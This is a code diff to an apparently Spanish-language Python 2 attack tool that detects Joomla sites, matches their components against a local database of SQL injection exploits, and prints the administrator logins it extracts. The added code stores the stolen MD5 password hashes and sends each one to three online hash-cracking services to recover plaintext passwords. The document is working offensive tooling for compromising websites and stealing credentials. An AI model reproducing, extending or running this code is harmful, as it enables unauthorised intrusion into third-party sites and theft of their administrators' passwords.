@@ -1,9 +1,10 @@
 #-*- coding:utf-8 -*-
-import time,sys,re
+import time,sys,re,os, urllib, urllib2
 import sqlite3 as lite
 from BeautifulSoup import BeautifulSoup
 from urllib import FancyURLopener
 componentes = []
+datosAccesoMD5 = []
 class Browser(FancyURLopener):
 	version = 'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)'
 def getHTML(urlBase):
@@ -59,7 +60,6 @@ def checkIfJoomla(SITE):
 		if htmlCode.find("joomla") > 0: # chekamos si existe "joomla" en index.php de /administrator
 			metas = BeautifulSoup(getHTML(SITE))
 			print outScreen(SITE + ' -> ','green')+outScreen('Motor Joomla confirmando!!\n','greenB')
-			
 			i = 0
 			for tag in metas.findAll('meta', content=True): # meter URLS en un ARRAY sin repetir
 				i = i +1
@@ -109,7 +109,7 @@ def checkOnDB(component,SITE):
 		con = lite.connect('kmaper.db')
 		cur = con.cursor()     
 		cur.execute("SELECT * FROM bugsSQLi where kname='"+component+"'")
-		print outScreen("Trying with -> ",'whiteB')+outScreen(component,'yellowB')
+		print outScreen("Buscando exploit para -> ",'whiteB')+outScreen(component,'yellowB')
 		time.sleep(3)
 		rows = cur.fetchall()
 		onDB = 0
@@ -139,9 +139,13 @@ def checkOnDB(component,SITE):
 				for datos in urls.findAll('k', kmaper=True): #
 					datos = datos['kmaper']
 					print outScreen(SITE + ' -> Login: ','whiteB')+outScreen(datos[0:32].encode('utf-8'),'greenB')
+					if datos[0:32] not in datosAccesoMD5: # Guardamos los hashes en un []
+						datosAccesoMD5.append(datos[0:32])
 					k = k + 1
 				if k > 0:
 					print outScreen(str(k/2)+' Datos de acceso encontrados!','')
+					print ''
+					desencriptar(SITE,datosAccesoMD5) # Enviamos a desencriptar
 				else:
 					print outScreen('Osea no tuviste suerte','')
 				print
@@ -170,7 +174,7 @@ def getInfoJoomla(SITE):
 		if url.find(SITE) >= 0 and url.find("option=com_") >= 0: # Solo URL's internas & siempre las URL's tipo "option=com_*"
 			#print url
 			getComps = re.match("(.*?)option\=(.*?)\&", url)
-			if(getComps.group(2) != 'com_content' and getComps.group(2) != 'com_search' and getComps.group(2) != 'com_contact' and getComps.group(2) != 'com_user'):
+			if(getComps.group(2) != 'com_content' and getComps.group(2) != 'com_search' and getComps.group(2) != 'com_contact' and getComps.group(2) != 'com_user'): # exepto los com_* del nucleo de Joomla!	
 				if getComps.group(2) not in componentes:
 					componentes.append(getComps.group(2)) 
 	for comp in componentes:
@@ -180,6 +184,78 @@ def getInfoJoomla(SITE):
 	for component in componentes:
 		checkOnDB(component,SITE)
 	return 0
+def md5online(hash):
+	pre = urllib.urlencode({'md5':hash,'search':0,'action':'decrypt','a':24628722})
+	try:
+	    html = urllib2.urlopen('http://www.md5online.es/', pre, 100)	
+	    # :limegreen'>Encontrado : <b>kharen</b></span><br />
+	    buscar = re.search(r'(Encontrado : <b>)(.+[^>])(</b></span><br />)', html.read())
+	    if buscar:
+	        return outScreen(buscar.group(2),'greenB')
+	    else:
+	        return 1 #'No Encontrado!'
+	except urllib2.URLError:
+	    return 2 #'Error en el sitio de consulta' 
+def md5decryption(hash):
+	pre = urllib.urlencode({'hash':hash,'submit':'Decrypt+It'})
+	try:
+	    html = urllib2.urlopen('http://md5decryption.com/', pre, 100)	
+	    # <font size="2">Decrypted Text: </font></b><font size="2">teamo</font>
+	    buscar = re.search(r'(Decrypted Text: </b>)(.+[^>])(</font><br/><center>)', html.read())
+	    if buscar:
+	        return outScreen(buscar.group(2),'greenB')
+	    else:
+	        return 1 #'No Encontrado!'
+	except urllib2.URLError:
+	    return 2 #'Error en el sitio de consulta'
+def MD5myAddr(hash):
+	pre = urllib.urlencode({'md5':hash,'submit':'Put MD5 hash here'})
+	try:
+	    html = urllib2.urlopen('http://md5.my-addr.com/md5_decrypt-md5_cracker_online/md5_decoder_tool.php', pre, 100)	
+	    # no pude sacar con expresiones regulares :(
+	    spp = html.read().split("<span class='middle_title'>Hashed string</span>: ")
+	    if(len(spp) == 2):
+		    s1 = spp[1].split("</div>")
+		    return outScreen(s1[0],'greenB')
+	except urllib2.URLError:
+	    return 2 #'Error en el sitio de consulta'
+def desencriptar(SITE,hashes):
+	k = 0
+	for hash in hashes:
+		desencriptado = False
+		if ((k % 2) == 1):
+			if(desencriptado == False):
+				print outScreen('Enviando -> ' + hash,'whiteB') + outScreen(' -> md5online.com','blueB')
+				respuesta = md5online(hash)
+				if (respuesta != 1 and respuesta != 2):
+					print outScreen(SITE + ' -> ' + hashes[k-1].encode('utf-8') + ' -> ','whiteB') + outScreen(str(respuesta).encode('utf-8'),'redB')
+					desencriptado = True
+					print
+				else:
+					print outScreen(hash + ' -> ','whiteB') + outScreen('no encontrado!','redB')
+					print
+			if(desencriptado == False):
+				print outScreen('Enviando -> ' + hash,'whiteB') + outScreen(' -> md5decryption.com','blueB')
+				respuesta = md5decryption(hash)
+				if (respuesta != 1 and respuesta != 2):
+					print outScreen(SITE + ' -> ' + hashes[k-1].encode('utf-8') + ' -> ','whiteB') + outScreen(str(respuesta).encode('utf-8'),'redB')
+					desencriptado = True
+					print
+				else:
+					print outScreen(hash + ' -> ','whiteB') + outScreen('no encontrado!','redB')
+					print
+			if(desencriptado == False):
+				print outScreen('Enviando -> ' + hash,'whiteB') + outScreen(' -> MD5myAddr.com','blueB')
+				respuesta = MD5myAddr(hash)
+				if (respuesta != 1):
+					print outScreen(SITE + ' -> ' + hashes[k-1].encode('utf-8') + ' -> ','whiteB') + outScreen(str(respuesta).encode('utf-8'),'redB')
+					desencriptado = True
+					print
+				else:
+					print outScreen(hash + ' -> ','whiteB') + outScreen('no encontrado!','redB')
+					print
+		k = k + 1
+
 def getSITE(urlBase):
 	if urlBase.find('/') <= 0 : urlBase = urlBase+'/'
 	if urlBase.startswith('www') : urlBase = 'http://'+urlBase
